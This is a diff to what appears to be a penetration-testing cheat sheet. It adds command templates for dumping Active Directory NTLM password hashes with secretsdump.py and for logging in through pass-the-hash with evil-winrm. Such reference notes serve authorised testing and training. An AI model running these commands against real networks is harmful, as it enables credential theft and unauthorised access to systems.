@@ -191,6 +191,17 @@ Command : smbclient -U {USER} -L \\\\{IP/DOMAIN}\\
 Command : smbclient -U {USER} \\\\{IP/DOMAIN}\\{SHARE}
 ```
 
+#### Dump AD password hashes
+
+```
+Command : python3 secretsdump.py -just-dc-ntlm {DOMAIN}/{USER}@{IP}
+```
+
+#### Pass the hash
+```
+Command: evil-winrm -i {IP} -u {USER} -H {HASH}
+```
+
 ## Kerberos
 
 ### Tools
